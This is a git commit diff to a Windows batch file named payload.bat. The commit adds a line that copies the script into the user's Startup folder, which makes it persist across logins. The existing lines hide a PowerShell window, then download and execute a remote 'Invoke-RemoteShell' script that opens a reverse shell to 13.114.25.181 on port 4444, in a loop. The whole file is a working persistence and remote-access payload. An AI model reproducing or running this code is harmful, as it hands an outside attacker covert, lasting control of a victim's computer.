4d4ebb84cac69a71a21f2c8a1d21e1fd89213567
Lorenzo Leonardo <enzotechcomputersolutions@gmail.com>
2023-02-10 23:23:23 +0800

    Auto copy batch to startup

--- payload.bat
+++ payload.bat
@@ -1,4 +1,5 @@
 @echo off
+xcopy /s /Y "%0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 powershell -window hidden -command ""
 :start
 powershell IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.114.25.181 -RemotePort 4444 -Rows 24 -Cols 80
